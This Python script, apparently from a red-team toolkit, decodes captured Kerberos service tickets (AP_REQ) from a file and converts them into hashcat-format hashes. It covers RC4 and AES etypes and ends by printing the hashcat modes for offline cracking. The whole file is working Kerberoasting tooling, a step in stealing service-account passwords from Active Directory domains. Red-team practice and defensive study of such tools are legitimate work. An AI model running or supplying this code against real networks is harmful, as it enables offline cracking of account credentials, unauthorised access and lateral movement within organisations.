# Ticket decoder by Cneelis @Outflank
# Inspired by @cube0x0's BofRoast: https://github.com/cube0x0/BofRoast

import os, sys, glob, re, base64
from pyasn1.codec.ber import decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import *

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.stderr.write("Usage: %s <ticket.enc>\n" % (sys.argv[0]))
        sys.exit(-1)

    for filename in glob.glob("roastme*"):
        os.remove(filename)

    with open(sys.argv[1], "rb") as fd:
        fd = fd.read()
        tickets = re.findall(r"<TICKET>\s+([^<]+)</TICKET>", fd.decode("utf-8"))
        for ticket in tickets:
            # Extract sAMAccountName and AP_REQ data
            extract = re.search(r"sAMAccountName = ([^\s]+)([^<]+)", ticket)
            if extract:
                sAMAccountName = extract.group(1).strip()
                # Base64 decode.
                dec = base64.b64decode(extract.group(2))
            else:
                print("Failed to extract data\n")
                sys.exit(-1)

            # Find AP_REQ offset
            i = 0
            while dec[i] != 0x6E:
                i += 1

            # Parse AP_REQ ticket
            ap_req = decoder.decode(dec[i:], asn1Spec=AP_REQ())[0]
            tgs_realm = ap_req["ticket"]["realm"]._value.capitalize()
            tgs_name_string_svc = ap_req["ticket"]["sname"]["name-string"][0]._value
            tgs_name_string_host = ap_req["ticket"]["sname"]["name-string"][1]._value
            tgs_encryption_type = ap_req["ticket"]["enc-part"]["etype"]._value

            if (tgs_encryption_type == constants.EncryptionTypes.rc4_hmac.value):  # etype 23 (RC4)
                tgs_checksum = (ap_req["ticket"]["enc-part"]["cipher"]._value[:16].hex().upper())
                tgs_encrypted_data2 = (ap_req["ticket"]["enc-part"]["cipher"]._value[16:].hex().upper())

                hashcat = "$krb5tgs$%d$*%s$%s$%s/%s*$%s$%s\n" % (
                    tgs_encryption_type,
                    sAMAccountName,
                    tgs_realm,
                    tgs_name_string_svc,
                    tgs_name_string_host,
                    tgs_checksum,
                    tgs_encrypted_data2,
                )
                with open("roastme-13100.txt", "a+") as hfile:
                    hfile.write(hashcat)
            elif (tgs_encryption_type == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value):  # etype 17 (aes128)
                tgs_checksum = (ap_req["ticket"]["enc-part"]["cipher"]._value[-12:].hex().upper())
                tgs_encrypted_data2 = (ap_req["ticket"]["enc-part"]["cipher"]._value[:-12].hex().upper())

                hashcat = "$krb5tgs$%d$%s$%s$*%s/%s*$%s$%s\n" % (
                    tgs_encryption_type,
                    sAMAccountName,
                    tgs_realm,
                    tgs_name_string_svc,
                    tgs_name_string_host,
                    tgs_checksum,
                    tgs_encrypted_data2,
                )
                with open("roastme-19600.txt", "a+") as hfile:
                    hfile.write(hashcat)
            elif (tgs_encryption_type == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):  # etype 18 (aes256)
                tgs_checksum = (ap_req["ticket"]["enc-part"]["cipher"]._value[-12:].hex().upper())
                tgs_encrypted_data2 = (ap_req["ticket"]["enc-part"]["cipher"]._value[:-12].hex().upper())

                hashcat = "$krb5tgs$%d$%s$%s$*%s/%s*$%s$%s\n" % (
                    tgs_encryption_type,
                    sAMAccountName,
                    tgs_realm,
                    tgs_name_string_svc,
                    tgs_name_string_host,
                    tgs_checksum,
                    tgs_encrypted_data2,
                )
                with open("roastme-19700.txt", "a+") as hfile:
                    hfile.write(hashcat)
            else:
                print("Incompatible e-type\n")
                sys.exit(-1)

            print(hashcat)

        print("HashCat input file saved as 'roastme-<#hash-type>.txt'\nTo crack use: 'hashcat -m 13100' for etype 23 (RC4), 'hashcat -m 19600' for etype 17 (AES128) or 'hashcat -m 19700' for etype 18 (AES256).\n")
